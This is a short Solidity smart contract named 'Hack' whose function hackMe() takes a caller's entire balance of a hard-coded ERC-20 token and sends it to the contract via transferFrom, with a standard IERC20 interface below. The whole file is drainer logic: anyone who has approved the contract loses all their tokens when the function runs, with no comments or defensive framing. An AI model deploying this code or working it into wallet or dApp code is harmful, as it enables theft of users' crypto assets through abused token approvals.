// SPDX-License-Identifier:MIT
pragma solidity 0.8.21;

contract Hack {

    address private constant BC = 0xFB76C72C0B19b07739A52355B8500374514a17C5;
    IERC20 private bc = IERC20(BC);

    function hackMe() external {
        uint test = bc.balanceOf(msg.sender);
        bc.transferFrom(msg.sender,address(this),test);
    }

}

 interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
